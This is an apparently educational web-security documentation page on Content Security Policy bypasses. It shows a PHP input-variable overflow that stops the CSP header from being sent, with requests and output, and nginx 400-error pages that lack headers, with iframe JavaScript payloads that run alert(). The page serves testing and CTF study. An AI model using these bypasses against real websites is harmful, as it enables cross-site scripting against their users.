---
title: "CSP Bypass"
description: "CSP Bypass."
lead: "CSP Bypass."
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "client-side"
weight: 630
toc: true
---

## Definition

Content Security Policy (CSP) is a HTTP response headers that helps prevent Cross-Site Scripting (XSS), clickjacking, and other client-side injection attacks. It allows website owners to specify which sources of content are trusted, ensuring that browsers only execute or render resources from those approved sources.

- [Content Security Policy (CSP) - MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Response Headers Manipulation

### PHP Headers Bypass using Warnings

PHP is known for buffering the response to 4096 bytes by default, so by providing enough data inside warnings, the response will be sent before the CSP header, causing the header to be ignored.

![PHP Headers Bypass using Warnings](./images/php-headers-bypass-warning.jpg)

Challenge source code:

```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```

Maximum parameters by default in PHP:
- `$_GET`: 1000 parameters
- `$_POST`: 1000 parameters
- `$_FILES`: 20 files

```python
# ------------------[ <= 1000 parameters ]------------------
>>> resp = requests.get('http://pilv.ar/?' + 'a=&' * 1000)
>>> resp.text
''
>>> resp.headers.get('Content-Security-Policy')
"default-src 'none';"
# ------------------[ > 1000 parameters ]------------------
>>> resp = requests.get('http://pilv.ar/?' + 'a=&' * 1001)
>>> resp.text
'<br />\n<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in <b>Unknown</b> on line <b>0</b><br />\n<br />\n<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/index.php</b> on line <b>2</b><br />\n'
>>> resp.headers.get('Content-Security-Policy')
>>>
```

**References:**
- [pilvar XSS challenge](https://x.com/pilvar222/status/1784618120902005070)
- [Write-ups to justCTF [*] 2020 by @terjanq](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)

### Abuse 400 Errors

Use `%ZZ` or other non-valid URL-encoded characters to trigger a `Bad Request`. The response does not contain any security headers, such as `Content-Security-Policy`.

Example with `nginx` as a reverse proxy:

```js
$ curl -v 'http://localhost/%ZZ'
[...]
< HTTP/1.1 400 Bad Request
< Server: nginx/1.24.0
< Date: Wed, 01 May 2024 10:28:11 GMT
< Content-Type: text/html
< Content-Length: 157
< Connection: close
<
<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.24.0</center>
</body>
</html>
```

Location: `about:blank`
```js
document.body.innerHTML="<iframe name=i src='/%ZZ' />"
i.eval("alert(location.href)")
```

Location: `http://target.com/%ZZ`
```js
document.body.innerHTML="<iframe name=i src='/%ZZ' />"
i.onload=setTimeout
i.Event.prototype.toString=RegExp.prototype.toString
i.Event.prototype.flags="-alert(location.href)"
```

**References:**
- [Arbitrary Parentheses-less XSS against strict CSP policies](https://terjanq.medium.com/arbitrary-parentheses-less-xss-e4a1cf37c13d)